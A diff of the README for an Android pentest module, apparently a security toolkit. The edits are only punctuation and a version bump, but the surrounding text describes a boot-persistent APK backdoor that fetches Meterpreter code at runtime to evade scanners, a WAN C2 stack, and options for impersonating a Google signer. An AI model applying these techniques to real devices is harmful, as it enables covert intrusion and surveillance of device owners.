 **BootBuddy's solution:** The APK contains no Meterpreter bytecode at all. It contains only:
 
-1. **BootReceiver** — triggers on `BOOT_COMPLETED`
-2. **AgentService** — called by BootReceiver, performs two actions:
+1. **BootReceiver** - triggers on `BOOT_COMPLETED`
+2. **AgentService** - called by BootReceiver, performs two actions:
    - Writes a startup script to the device (runs once)
    - Fetches `s.dex` from a bore tunnel and loads it with `DexClassLoader`
-3. **s.dex** — a Metasploit DEX file served by your machine through a bore tunnel
+3. **s.dex** - a Metasploit DEX file served by your machine through a bore tunnel
 
 At boot:
 ```
@@ -1494,7 +1494,7 @@ At boot:
 7. Session opens
 ```
 
-Because the DEX is fetched at runtime, static scanners see only a loading class — no
+Because the DEX is fetched at runtime, static scanners see only a loading class - no
 Meterpreter bytecode to detect.
 
 **Building BootBuddy:**
@@ -1531,7 +1531,7 @@ adb install -r output/bootbuddy.apk
 
 ---
 
-## 30. WAN C2 — Working Without Port Forwarding
+## 30. WAN C2 - Working Without Port Forwarding
 
 ### The full WAN stack
 
@@ -1555,7 +1555,7 @@ adb install -r output/bootbuddy.apk
 
 ### Using the C2 watchdog
 
-The watchdog manages the whole stack — bore tunnels, HTTP server, MSF handler — and
+The watchdog manages the whole stack - bore tunnels, HTTP server, MSF handler - and
 auto-restarts any component that dies.
 
 ```bash
@@ -1594,7 +1594,7 @@ adb exec-out screenrecord --output-format=h264 --time-limit=0 -
                     └── browser displays as <img src="/api/media/screen">
 ```
 
-The browser's `<img>` tag keeps loading from the MJPEG endpoint — this is the standard
+The browser's `<img>` tag keeps loading from the MJPEG endpoint - this is the standard
 Motion JPEG streaming technique. No WebSockets, no special protocol.
 
 ### Aspect ratio detection
@@ -1625,7 +1625,7 @@ The **Shell** tab in the GUI is a real PTY (pseudo-terminal) running your local 
 ### How it works
 
 **Server side:**
-- `pty.fork()` — forks a child process with a PTY attached
+- `pty.fork()` - forks a child process with a PTY attached
 - Child exec's your shell (`zsh` → `bash` → `/bin/sh`)
 - Parent reads PTY output in a thread → appends to `_pty_buf` → broadcasts to SSE clients
 - `/api/pty/input` POST receives keystrokes and writes them to the PTY fd
@@ -1672,7 +1672,7 @@ install steps.
 
 ---
 
-# Part V — Reference
+# Part V - Reference
 
 ## 34. Global Parameter Reference
 
@@ -1680,7 +1680,7 @@ install steps.
 |-----------|------|---------|---------|-------------|
 | `operation` | string | `recon` | `--operation` | Operation to run |
 | `device` | string | auto | `--device` | ADB serial |
-| `package` | string | — | `--package` | Target app package name |
+| `package` | string | - | `--package` | Target app package name |
 | `lhost` | string | auto | `--lhost` | Your IP address |
 | `lport` | int | `4444` | `--lport` | Listener port |
 | `payload` | string | `android/meterpreter/reverse_tcp` | `--payload` | MSF payload type |
@@ -1694,10 +1694,10 @@ install steps.
 | `proxy-host` | string | auto | `--proxy-host` | Proxy server IP |
 | `proxy-port` | int | `8080` | `--proxy-port` | Proxy port |
 | `bypass-ssl` | bool | `false` | `--bypass-ssl` | Frida SSL pinning bypass |
-| `nvd-api-key` | string | — | `--nvd-api-key` | NVD API key |
+| `nvd-api-key` | string | - | `--nvd-api-key` | NVD API key |
 | `hook-mode` | string | `all` | `--hook-mode` | Frida hook type |
 | `hook-timeout` | int | `30` | `--hook-timeout` | Frida session duration (s) |
-| `trace-method` | string | — | `--trace-method` | Method/class to trace |
+| `trace-method` | string | - | `--trace-method` | Method/class to trace |
 | `agent-mode` | string | `recon` | `--agent-mode` | Agent mode: recon/exploit/c2 |
 | `c2-host` | string | auto | `--c2-host` | Agent callback IP |
 | `c2-port` | int | `8889` | `--c2-port` | Agent callback port |
@@ -1706,12 +1706,12 @@ install steps.
 | `qr-mode` | string | `apk` | `--qr-mode` | QR type: apk/intent/adb_pair/deeplink |
 | `pair-port` | int | `37001` | `--pair-port` | ADB pairing port |
 | `pair-code` | string | `123456` | `--pair-code` | ADB pairing code |
-| `cve` | string | — | `--cve` | CVE to target |
+| `cve` | string | - | `--cve` | CVE to target |
 | `adb-port` | int | `5555` | `--adb-port` | ADB WiFi port |
 | `serve-port` | int | `8888` | `--serve-port` | HTTP APK delivery port |
 | `msf` | bool | `false` | `--msf` | Merge Meterpreter into rebuild |
 | `msf-lport` | int | `4444` | `--msf-lport` | Meterpreter port for rebuild |
-| `mode` | string | — | `--mode` | `gui` to launch web interface |
+| `mode` | string | - | `--mode` | `gui` to launch web interface |
 | `gui-port` | int | `8897` | `--gui-port` | GUI server port |
 | `serve` | bool | `true` | `--serve` | `false` = headless JSON output |
 | `cleanup` | bool | `false` | `--cleanup` | Delete work dir after run |
@@ -1720,11 +1720,11 @@ install steps.
 | `msf-session` | int | `1` | `--msf-session` | Meterpreter session number |
 | `duration` | int | `5` | `--duration` | Mic recording duration (s) |
 | `app-name` | string | `Google LLC` | `--app-name` | Signing CN for bypass |
-| `fake-pkg` | string | — | `--fake-pkg` | Override package name |
-| `app-label` | string | — | `--app-label` | Launcher name for customize |
-| `package-name` | string | — | `--package-name` | New applicationId for customize |
-| `icon-path` | string | — | `--icon-path` | Icon file/URL for customize |
-| `output-name` | string | — | `--output-name` | Output APK filename |
+| `fake-pkg` | string | - | `--fake-pkg` | Override package name |
+| `app-label` | string | - | `--app-label` | Launcher name for customize |
+| `package-name` | string | - | `--package-name` | New applicationId for customize |
+| `icon-path` | string | - | `--icon-path` | Icon file/URL for customize |
+| `output-name` | string | - | `--output-name` | Output APK filename |
 
 ---
 
@@ -1735,7 +1735,7 @@ Detected vulnerabilities and their meanings:
 | ID | Severity | What it means | How to fix |
 |----|----------|---------------|-----------|
 | `sql_injection` | CRITICAL | Content Provider query is not parameterized | Use `SQLiteDatabase.query()` with `selectionArgs[]`, never concatenate user input into query strings |
-| `adb_network` | CRITICAL | `adb tcpip` is active — anyone on the network can control the device | `adb usb` to disable, or `adb shell settings put global adb_enabled 0` |
+| `adb_network` | CRITICAL | `adb tcpip` is active - anyone on the network can control the device | `adb usb` to disable, or `adb shell settings put global adb_enabled 0` |
 | `hardcoded_secrets` | HIGH | API keys, passwords, or tokens are in the code or assets | Store secrets server-side; use Android Keystore for device-local secrets |
 | `insecure_crypto` | HIGH | DES, MD5 (for security), SHA1 (for security), or ECB mode detected | Use AES-256-GCM, SHA-256 or better, PBKDF2/bcrypt for passwords |
 | `debuggable` | HIGH | `android:debuggable="true"` in the released app | Set `debuggable false` in release build variant; never ship debug builds |
@@ -1800,7 +1800,7 @@ tools/mobile/android/apk_backdoor/output/
 adb kill-server && adb start-server
 adb devices
 
-# udev rule (Linux — needed on some distros)
+# udev rule (Linux - needed on some distros)
 echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"' \
   | sudo tee /etc/udev/rules.d/51-android.rules
 sudo udevadm control --reload-rules && sudo udevadm trigger
@@ -1893,11 +1893,11 @@ curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x8
 
 ---
 
-# Part VI — Contributing and Module Development
+# Part VI - Contributing and Module Development
 
 ## 38. How the Module Talks to secV
 
-The secV shell is a Go binary. It does not import Python — instead it:
+The secV shell is a Go binary. It does not import Python - instead it:
 
 1. Reads `module.json` to know what parameters the module accepts
 2. Collects user-set parameters via `set key value` commands
@@ -1920,12 +1920,12 @@ The secV shell is a Go binary. It does not import Python — instead it:
 
 The Python module (`android_pentest.py`) reads this, runs the operation, and prints results.
 
-The GUI is different — `android_gui.py` is a standalone HTTP server that the module launches
+The GUI is different - `android_gui.py` is a standalone HTTP server that the module launches
 directly. The GUI communicates with the browser over REST/SSE, not via secV's JSON protocol.
 
 ---
 
-## 39. Module Architecture — Where Everything Lives
+## 39. Module Architecture - Where Everything Lives
 
 ```
 android_pentest.py      ← CLI entrypoint, reads stdin JSON, dispatches operations
@@ -1937,7 +1937,7 @@ c2_gui.py               ← Standalone C2 dashboard
 apk_backdoor/
   build_bootbuddy.py    ← BootBuddy APK builder
   AgentService.smali    ← Agent smali fragment injected into APKs
-  secv.keystore         ← Consistent signing key (DO NOT REPLACE — breaks updates)
+  secv.keystore         ← Consistent signing key (DO NOT REPLACE - breaks updates)
 agent/
   secv_agent.c          ← ARM64 C agent source
   secv_agent.sh         ← Shell agent (portable fallback)
@@ -2013,7 +2013,7 @@ In `module.json`, add to `help.parameters.operation.options`:
 
 And to `help.parameters.operation.examples`:
 ```json
-"my_new_op  — Brief description of what it does"
+"my_new_op  - Brief description of what it does"
 ```
 
 **Step 4: Add it to the GUI sidebar**
@@ -2035,9 +2035,9 @@ appropriate group:
 ```
 
 **Field types:**
-- `t:"text"` — free text input
-- `t:"select"` — dropdown, add `opts:["opt1","opt2"]`
-- `t:"checkbox"` — boolean toggle
+- `t:"text"` - free text input
+- `t:"select"` - dropdown, add `opts:["opt1","opt2"]`
+- `t:"checkbox"` - boolean toggle
 
 **Step 5: Test**
 
@@ -2068,7 +2068,7 @@ To add a completely new section to the Live tab (or a new tab entirely):
     <button class="live-btn active" onclick="stopMyFeature()" id="my-stop-btn" style="display:none">■ Stop</button>
   </div>
   <div id="my-content-area">
-    <div id="my-placeholder">Feature off — click Start</div>
+    <div id="my-placeholder">Feature off - click Start</div>
     <!-- your content here -->
   </div>
 </div>
@@ -2142,9 +2142,9 @@ def _api_my_action(self, body: dict):
 ```
 
 **Available helper methods:**
-- `self._json(dict)` — send JSON response with 200 OK
-- `self._cors()` — add CORS headers (call before `end_headers()`)
-- `self._send(code, content_type, bytes)` — send arbitrary response
+- `self._json(dict)` - send JSON response with 200 OK
+- `self._cors()` - add CORS headers (call before `end_headers()`)
+- `self._send(code, content_type, bytes)` - send arbitrary response
 
 **For streaming responses (SSE):**
 
@@ -2174,12 +2174,12 @@ Before opening a pull request for this module:
 **Code quality:**
 - [ ] New operation added to `android_pentest.py` with proper error handling
 - [ ] Operation registered in the dispatch dict in `_run()`
-- [ ] No unhandled exceptions — all external calls wrapped in try/except
-- [ ] No hardcoded paths — use `Path.home() / ".secv" / ...` for output directories
+- [ ] No unhandled exceptions - all external calls wrapped in try/except
+- [ ] No hardcoded paths - use `Path.home() / ".secv" / ...` for output directories
 - [ ] New tool dependencies listed in `rqm.md` under `#python`, `#pacman`, and `#apt`
 
 **Documentation:**
-- [ ] Operation added to `module.json` — `options`, `examples`, and `features` arrays
+- [ ] Operation added to `module.json` - `options`, `examples`, and `features` arrays
 - [ ] Parameter added to `module.json` `help.parameters` with description and type
 - [ ] README.md (this file) updated with the new operation in the correct Part III section
 - [ ] GUI operation entry added to the `OPS` object in `android_gui.py` with `cli` hint
@@ -2193,7 +2193,7 @@ Before opening a pull request for this module:
 - [ ] CLI `--help` or `info android_pentest` in secV shell shows the new operation
 
 **Security:**
-- [ ] No command injection — all user input to subprocesses goes through list-form arguments
+- [ ] No command injection - all user input to subprocesses goes through list-form arguments
   (`subprocess.run(["adb", "shell", user_input])` is safe; `os.system("adb shell " + user_input)` is NOT)
 - [ ] File paths from user input are validated or restricted to the `~/.secv/` tree
 - [ ] Authorization: every operation that touches a device requires explicit device selection
@@ -2208,4 +2208,4 @@ Before opening a pull request for this module:
 
 ---
 
-*secV android\_pentest v2.4.2 "tauri" · last updated 2026-05-18 · maintained by 0xb0rn3*
+*secV android\_pentest v2.4.3 "tauri" · last updated 2026-05-21 · maintained by 0xb0rn3*
